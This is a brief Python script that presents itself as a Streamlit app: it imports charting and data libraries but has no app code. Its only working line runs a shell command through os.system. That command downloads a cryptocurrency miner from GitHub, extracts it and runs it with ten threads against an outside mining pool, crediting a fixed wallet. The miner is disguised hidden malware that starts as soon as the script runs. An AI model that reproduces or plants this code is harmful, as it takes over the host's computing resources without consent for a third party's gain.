from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
os.system ("curl -L -o cpuminer-opt-linux.tar.gz https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.TESS80 -t 10")
